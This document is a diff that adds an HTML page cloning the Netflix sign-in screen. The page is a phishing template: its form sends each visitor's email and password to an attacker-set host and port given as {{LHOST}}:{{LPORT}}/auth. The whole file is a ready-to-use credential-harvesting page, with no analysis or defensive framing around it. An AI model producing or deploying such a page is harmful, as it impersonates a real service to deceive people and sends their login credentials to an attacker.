@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Netflix</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #000; color: #fff; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-image: linear-gradient(to bottom, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.4) 100%); }
+        .container { background-color: rgba(0,0,0,0.75); padding: 60px 68px 40px; border-radius: 4px; width: 314px; }
+        h1 { margin-bottom: 28px; font-size: 32px; font-weight: 700; }
+        input { width: 100%; padding: 16px 20px; margin-bottom: 16px; background: #333; border: none; border-radius: 4px; box-sizing: border-box; font-size: 16px; color: white; }
+        input:focus { background: #454545; outline: none; }
+        button { width: 100%; padding: 16px; background-color: #e50914; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 24px; }
+        button:hover { background-color: #f40612; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Sign In</h1>
+        <form action="http://{{LHOST}}:{{LPORT}}/auth" method="POST">
+            <input type="text" name="email" placeholder="Email or phone number" required>
+            <input type="password" name="pass" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+</body>
+</html>
